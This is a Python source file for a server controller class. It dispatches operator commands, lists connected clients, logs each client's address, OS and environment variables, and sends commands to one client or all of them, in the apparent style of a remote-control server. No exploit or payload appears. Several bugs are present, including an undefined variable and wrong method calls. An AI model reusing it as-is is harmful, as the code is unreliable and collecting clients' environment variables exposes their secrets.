from multiprocessing import Pipe
from typing import Callable


class BasicControler:
    def __init__(self, pipe : Pipe, server_callback : Callable):
        self.name = "Basic Controler"
        self.pipe = pipe
        self.server = server_callback
        self.headers = self.server.sysHeadears
    
    def check_signal(self):
        check = self.pipe.poll
        if check:
            recv = self.pipe.recv()
            return recv
        else:
            return None
    
    def sendMsg2Client(self, cliID: str, message: str):
        if cliID.lower() == "all":
            for cli in self.server.Central.clients.values():
                cli.sendMsg(message)
            return
        client = self.server.Central.clients.get(cliID)
        if not client:
            self.server.Msg(f"Client ID:{clID} is not connected")
            return
        client.sendMsg(message)
    
    def saveCliInfo(self, cliID: str) -> None:
        if cliID.lower() == "all":
            if len(self.server.Central.clients) == 0:
                self.server.Msg("No connected clients")
                return
            response = ""
            for client in self.server.Central.clients.values():
                 response += f"\nClient Info ID={client.ID}\nAddr: {client.Addr}\nName: {client.CliName}\nOs System: {client.Os}\nOther Info:\n{client.EnvVar}\n\n\n\n"
            self.server.Msg(response, onlyLog=True)
            return
        client = self.server.Central.clients.get(cliID)
        if not client:
            self.server.Msg(f"[!!] ERROR: Client ID={cliID} does not connected [!!]")
            return
        response = f"\nClient Info ID={client.ID}\nAddr: {client.Addr}\nName: {client.CliName}\nOs System: {client.Os}\nOther Info:\n{client.EnvVar}"
        self.Msg(response, onlyLog=True)
    
    def _servCMD(self, cmd : list) -> None:
        match cmd[1]:
            case "start":
                self.server.listening()
            case "stop":
                self.server.stopListening()
            case "conf":
                self.server.Msg(self.server.config, dictFormat=True, dictName="Server Config")
            case "admin":
                match cmd[2]:
                    case "on":
                        self.server.Http.adminEnable = True
                    case "off":
                        self.server.Http.adminEnable = False
            case "end":
                self.server.turnOFF()
            case _:
                self.servCMD(cmd)

    def servCMD(self, cmd : list) -> None:
        match cmd[1]:
            case _:
                self.server.Msg("Unknown Command")

    def _taskCMD(self, cmd: list) -> None:
        match cmd[1]:
            case "show":
                self.server.Tasker.showTask()
            case _:
                self.taskCMD(cmd)

    def taskCMD(self, cmd: list) -> None:
        match cmd[1]:
            case _:
                self.server.Msg("Unknown Command")
    
    def _cliCMD(self, cmd: list) -> None:
        if not self.server.is_listening:
            self.server.Msg("[!!] Cant not execute command. Server not listening [!!]")
            return
        match cmd[1]:
            case "show":
                self.server.Central.showClient()
            case "send":
                try:
                    self.sendMsg2Client(cmd[2], cmd[3])
                except:
                    pass
            case "save":
                try:
                    self.saveCliInfo(cmd[2])
                except:
                    pass

            case _:
                self.cliCMD(cmd)
    
    def cliCMD(self, cmd: list) -> None:
        match cmd[1]:
            case _:
                self.server.Msg("Unknown Command")
    
    def unpackSysMsg(self, msg: str) -> list:
        msg = msg.split(self.headers)
        cmd = []
        for c in msg:
            if c == "" or c == " ":
                continue
            cmd.append(c)
        if len(cmd) == 0:
            return None
        return cmd
  
    def _sysCMD(self, msg: str, handler: object) -> None:
        self.server.Msg(f"SYS MSG:{msg}", sender=handler.ID, dev=True)
        cmd = self.unpackSysMsg(msg)
        if not cmd:
            self.server.Msg(f"[!!] WARNING ! Client id={handler.ID} addr: {handler.Addr} send unknown system message or try spoof you [!!]")
            return
        match cmd[0]:
            case "i":
                handler.updateInfo(cmd[1:])
            case "e":
                handler.sendMsg(cmd[1])
            case _:
                self.sysCMD(cmd, handler)
    
    def sysCMD(self, cmd: list, handler: object) -> None:
        self.server.Msg(f"[!!] WARNING ! Client id={handler.ID} addr: {handler.Addr} send unknown system message or try spoof you [!!]")

    def _execCMD(self, cmd : list) -> None:
        match cmd[0]:
            case "serv":
                self._servCMD(cmd)
            case "task":
                self._taskCMD(cmd)
            case "cli":
                self._cliCMD(cmd)
            case "help":
                self.server.Msg(self.help())
            case _:
                self.execCMD(cmd)
    
    def execCMD(self, cmd: list) -> None:
        match cmd[0]:
            case _:
                self.server.Msg("Unknown Command")
    
    def checkCMD(self, cmd: list) -> None:
        if not isinstance(cmd, list):
            self.server.Msg("[!!] WRONG command syntax. Must be a list [!!]")
        else:
            self._execCMD(cmd)
    
    def hilfe(self) -> str:
        hilfe = ""
        hilfe += f"\n***************{self.server.SERV_TYPE} HELP ****************************\n"
        hilfe += "ss serv start        - Start Server Listening\n"
        hilfe += "ss serv stop         - Stop Server Listening\n"
        hilfe += "ss serv conf         - Show Config Server\n"
        hilfe += "ss serv admin on     - Enable Http Admin Function\n"
        hilfe += "ss serv admin off    - Disable Http Admin Function\n"
        hilfe += "ss cli show          - Show All connected clients\n"
        hilfe += "ss cli send <cli_ID> <msg>   - Send message or command to client\n"
        hilfe += "ex: ss cli send 4 Hello      - Send Hello to client no 4\n"
        hilfe += "ex: ss cli send all Hello    - Send Hello to all clients\n"
        return hilfe
    
    def help(self) -> str:
        return self.hilfe()

    
    def START(self) -> None:
        self.server.Msg("Controler Start", dev=True)
        while True:
            cmd = self.check_signal()
            if not cmd:
                continue
            self.server.Msg(f"CMD: {cmd}", dev=True)
            self.checkCMD(cmd)
            
